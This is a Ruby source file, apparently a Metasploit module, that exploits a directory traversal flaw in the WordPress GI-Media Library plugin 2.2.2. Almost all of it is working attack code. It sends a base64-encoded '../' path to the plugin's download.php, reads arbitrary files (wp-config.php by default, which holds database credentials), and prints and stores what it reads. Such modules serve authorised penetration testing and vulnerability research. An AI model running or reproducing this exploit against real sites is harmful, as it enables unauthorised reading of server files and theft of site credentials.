##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress GI-Media Library Plugin File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "GI-Media Library" version 2.2.2, allowing to read arbitrary files on
        WordPress directory.
      },
      'References'     =>
        [
          ['WPVDB', '7754'],
          ['URL', 'http://wordpressa.quantika14.com/repository/index.php?id=24']
        ],
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery - QuantiKa14?
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The wordpress file to read', 'wp-config.php']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 3 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('gi-media-library', '3.0')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'gi-media-library', 'download.php'),
      'vars_get' =>
        {
          'fileid' => Rex::Text.encode_base64(traversal + filename)
        }
    )

    if res && res.code == 200 && res.body && res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'gimedia-library.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. Check the correct path wordpress files.")
    end
  end
end
